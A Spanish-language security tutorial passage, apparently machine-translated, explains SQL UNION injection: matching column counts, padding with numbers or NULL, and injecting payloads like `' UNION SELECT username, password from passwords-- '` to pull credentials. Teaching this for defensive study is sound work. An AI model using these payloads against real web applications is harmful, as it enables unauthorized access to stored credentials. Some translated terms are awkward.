# Union Clause

Hasta ahora, solo hemos estado manipulando la consulta original para subvertir la lógica de la aplicación web y la autenticación de derivación, utilizando el`OR`operador y comentarios. Sin embargo, otro tipo de inyección SQL inyecta consultas SQL todas ejecutadas junto con la consulta original. Esta sección demostrará esto usando el MySQL`Union`cláusula para hacer`SQL Union Injection`.

---

# **Unión**

Antes de comenzar a aprender sobre la inyección de la Unión, primero debemos aprender más sobre la cláusula de la Unión SQL. El[Unión](https://dev.mysql.com/doc/refman/8.0/en/union.html)La cláusula se usa para combinar los resultados de múltiples`SELECT`declaraciones. Esto significa que a través de un`UNION`inyección, podremos`SELECT`y volcar los datos de todo el DBMS, desde múltiples tablas y bases de datos. Intentemos usar el`UNION`operador en una base de datos de muestra. Primero, veamos el contenido del`ports`mesa:

Cláusula de sindicato

```
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)

```

A continuación, veamos la salida del`ships`tablas:

Cláusula de sindicato

```
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)

```

Ahora, intentemos usar`UNION`Para combinar ambos resultados:

Cláusula de sindicato

```
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)

```

Como podemos ver,`UNION`combinado la salida de ambos`SELECT`declaraciones en una, así que las entradas del`ports`mesa y el`ships`La tabla se combinaron en una sola salida con cuatro filas. Como podemos ver, algunas de las filas pertenecen al`ports`mesa mientras que otros pertenecen al`ships`mesa.

Nota: Los tipos de datos de las columnas seleccionadas en todas las posiciones deben ser los mismos.

---

# **Incluso columnas**

A`UNION`La declaración solo puede operar en`SELECT`declaraciones con un número igual de columnas. Por ejemplo, si intentamos`UNION`Dos consultas que tienen resultados con un número diferente de columnas, recibimos el siguiente error:

Cláusula de sindicato

```
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns

```

La consulta anterior resulta en un error, como el primero`SELECT`Devuelve una columna y la segunda`SELECT`Devuelve dos. Una vez que tenemos dos consultas que devuelven el mismo número de columnas, podemos usar el`UNION`operador para extraer datos de otras tablas y bases de datos.

Por ejemplo, si la consulta es:

Código:sql

```sql
SELECT * FROM products WHERE product_id = 'user_input'

```

Podemos inyectar un`UNION`consulta en la entrada, de modo que se devuelven filas de otra tabla:

Código:sql

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '

```

La consulta anterior volvería`username`y`password`entradas del`passwords`tabla, suponiendo que el`products`La tabla tiene dos columnas.

---

# **Columnas sin incluso**

Descubriremos que la consulta original generalmente no tendrá el mismo número de columnas que la consulta SQL que queremos ejecutar, por lo que tendremos que trabajar en torno a eso. Por ejemplo, supongamos que solo teníamos una columna. En ese caso, queremos`SELECT`, podemos poner datos basura para las columnas requeridas restantes para que el número total de columnas que somos`UNION`con permanece igual a la consulta original.

Por ejemplo, podemos usar cualquier cadena como datos basura, y la consulta devolverá la cadena como su salida para esa columna. Si nosotros`UNION`con la cuerda`"junk"`, el`SELECT`la consulta sería`SELECT "junk" from passwords`, que siempre volverá`junk`. También podemos usar números. Por ejemplo, la consulta`SELECT 1 from passwords`siempre volverá`1`como la salida.

Nota: Al llenar otras columnas con datos basura, debemos asegurarnos de que el tipo de datos coincida con el tipo de datos de las columnas, de lo contrario, la consulta devolverá un error. En aras de la simplicidad, utilizaremos los números como nuestros datos basura, que también serán útiles para rastrear nuestras posiciones de carga útil, como discutiremos más adelante.

Consejo: Para la inyección SQL avanzada, es posible que deseemos usar simplemente 'NULL' para llenar otras columnas, ya que 'NULL' se ajusta a todos los tipos de datos.

El`products`La tabla tiene dos columnas en el ejemplo anterior, por lo que tenemos que`UNION`con dos columnas. Si solo quisiéramos obtener una columna 'por ejemplo`username`', tenemos que hacer`username, 2`, de modo que tengamos el mismo número de columnas:

Código:sql

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords

```

Si tuviéramos más columnas en la tabla de la consulta original, tenemos que agregar más números para crear las columnas requeridas restantes. Por ejemplo, si se usa la consulta original`SELECT`en una tabla con cuatro columnas, nuestro`UNION`La inyección sería:

Código:sql

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '

```

Esta consulta volvería:

Cláusula de sindicato

```
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+

```

Como podemos ver, nuestra salida deseada de '`UNION SELECT username from passwords`'La consulta se encuentra en la primera columna de la segunda fila, mientras que los números llenaron las columnas restantes.